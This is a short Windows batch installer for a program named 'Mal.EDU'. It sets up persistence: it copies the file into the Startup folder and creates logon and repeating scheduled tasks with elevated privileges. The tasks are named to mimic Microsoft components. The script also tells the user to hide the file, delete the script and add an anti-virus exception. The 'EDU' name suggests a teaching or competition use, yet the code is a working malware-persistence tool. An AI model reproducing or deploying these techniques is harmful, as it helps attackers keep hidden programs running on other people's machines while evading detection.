@echo off
setlocal

echo MalEDU installer. This version is specific for CCIC.
::@StrataBytes, Github. GPLv3

echo Welcome to the Mal.EDU setup. Please make sure you are running this as Admin. Be sure to fully delete this script after use.
echo Please enter the full path to the Mal.EDU file (Be sure to hide it):
set /p ExePath=

if not exist "%ExePath%" (
    echo The file does not exist, please check the path and try again.
    goto End
)

echo Copying file to startup menu...
copy "%ExePath%" "%AppData%\Microsoft\Windows\Start Menu\Programs\Startup"

schtasks /create /tn "MicrosoftEssentialsLogin" /tr "%ExePath%" /sc onlogon /rl HIGHEST /f

echo Choose a repeat interval for the continuous execution of the program:
echo 1) Every 1 minute
echo 2) Every 2 minutes
echo 3) Every 5 minutes
echo 4) Every 10 minutes
echo 5) Every 15 minutes
echo 6) Every hour
set /p Choice=

if "%Choice%"=="1" set Interval=minute & set Modifier=1
if "%Choice%"=="2" set Interval=minute & set Modifier=2
if "%Choice%"=="3" set Interval=minute & set Modifier=5
if "%Choice%"=="4" set Interval=minute & set Modifier=10
if "%Choice%"=="5" set Interval=minute & set Modifier=15
if "%Choice%"=="6" set Interval=hour & set Modifier=1

if not defined Interval (
    echo Invalid choice. Operation cancelled - try again.
    goto End
)

schtasks /create /tn "EssentialsContinuous" /tr "%ExePath%" /sc %Interval% /mo %Modifier% /rl HIGHEST /f

:End
echo Operation completed. Mal.EDU is now live. If anti-virus is blocking, you may be forced to add an exception.
pause
